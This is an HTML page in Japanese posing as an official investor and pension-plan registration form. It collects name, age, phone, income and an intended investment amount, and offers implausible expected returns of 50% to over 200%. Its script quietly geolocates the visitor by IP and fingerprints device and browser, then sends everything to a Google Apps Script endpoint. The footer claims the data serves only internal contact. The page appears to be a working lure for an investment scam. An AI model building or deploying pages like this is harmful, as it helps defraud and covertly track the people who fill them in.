<!DOCTYPE html>
<html lang="ja>
<head>
<meta charset="UTF-8">
<title>資産運用プランB
年金プラン申請書</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

body{
font-family:"Hiragino Kaku Gothic ProN", Arial, sans-serif;
background:#f5f6fa;
margin:0;
}

.header{
background:#0b3a63;
color:white;
text-align:center;
padding:18px;
font-size:22px;
font-weight:bold;
}

.container{
max-width:600px;
margin:30px auto;
background:white;
padding:25px;
border-radius:10px;
box-shadow:0 6px 25px rgba(0,0,0,0.1);
}

label{
display:block;
margin-top:16px;
font-weight:600;
font-size:15px;
}

.required::before{
content:"* ";
color:red;
font-weight:bold;
}

.required::after{
content:" 必須";
color:#999;
font-size:11px;
margin-left:4px;
}

input,select{
width:100%;
padding:12px;
margin-top:6px;
border:1px solid #ddd;
border-radius:6px;
font-size:16px;
box-sizing:border-box;
}

button{
width:100%;
margin-top:25px;
padding:14px;
background:#0b3a63;
color:white;
border:none;
border-radius:6px;
font-size:18px;
cursor:pointer;
}

.footer{
margin-top:20px;
font-size:12px;
color:#888;
text-align:center;
}

</style>
</head>

<body>

<div class="header">公式投資家登録フォーム</div>

<div class="container">

<form id="registrationForm">

<label class="required">氏名</label>
<input type="text" name="name" required>

<label class="required">年齢</label>
<input type="number" name="age" min="18" max="100" required>

<label class="required">電話番号</label>
<input type="tel" name="phone" required>

<label class="required">投資経験</label>
<select name="experience" required>
<option value="">選択してください</option>
<option value="なし">なし</option>
<option value="1-3年">1〜3年</option>
<option value="3年以上">3年以上</option>
</select>

<label class="required">期待利回り</label>
<select name="expected_return" required>
<option value="">選択してください</option>
<option value="50%未満">50%未満</option>
<option value="50〜100%">50%〜100%</option>
<option value="200%以上">200%以上</option>
</select>

<label class="required">年収</label>
<select name="income" required>
<option value="">選択してください</option>
<option value="100万円未満">100万円未満</option>
<option value="100万〜300万円">100万〜300万円</option>
<option value="300万〜500万円">300万〜500万円</option>
<option value="500万円以上">500万円以上</option>
</select>

<label class="required">申込資金（円）</label>
<input type="number" name="fund" min="0" step="1000" required>

<button type="submit">申し込み送信</button>

</form>

<div class="footer">
※ご入力いただいた情報は、内部管理およびご連絡の目的のみで使用いたします。
</div>

</div>


<script>

// Google Script API
const scriptURL="https://script.google.com/macros/s/AKfycbz8d0bNSaEIC2saHWx_sKZLhVgvF34FevV70sCKRk5vjsD5x2QwAz2yD1txUSsfvO_tiQ/exec"

// 客户信息变量
let clientIP=""
let clientCountry=""
let clientCity=""

// 获取IP和地区
fetch("https://ipapi.co/json/")
.then(res=>res.json())
.then(data=>{

clientIP=data.ip
clientCountry=data.country_name
clientCity=data.city

})

// 获取设备
function getDevice(){

const ua=navigator.userAgent

if(/mobile/i.test(ua)) return "Mobile"
return "Desktop"

}

// 获取浏览器
function getBrowser(){

const ua=navigator.userAgent

if(ua.indexOf("Chrome")>-1) return "Chrome"
if(ua.indexOf("Safari")>-1) return "Safari"
if(ua.indexOf("Firefox")>-1) return "Firefox"

return "Unknown"

}


document.getElementById("registrationForm").addEventListener("submit",function(e){

e.preventDefault()

const formData=new FormData(this)

//客户编号
formData.append("client_id","C"+Date.now())

//IP信息
formData.append("ip",clientIP)
formData.append("country",clientCountry)
formData.append("city",clientCity)

//设备信息
formData.append("device",getDevice())
formData.append("browser",getBrowser())

fetch(scriptURL,{
method:"POST",
body:formData
})
.then(res=>{

window.location.href="success.html"

})
.catch(err=>{

alert("送信に失敗しました")

})

})

</script>

</body>
</html>
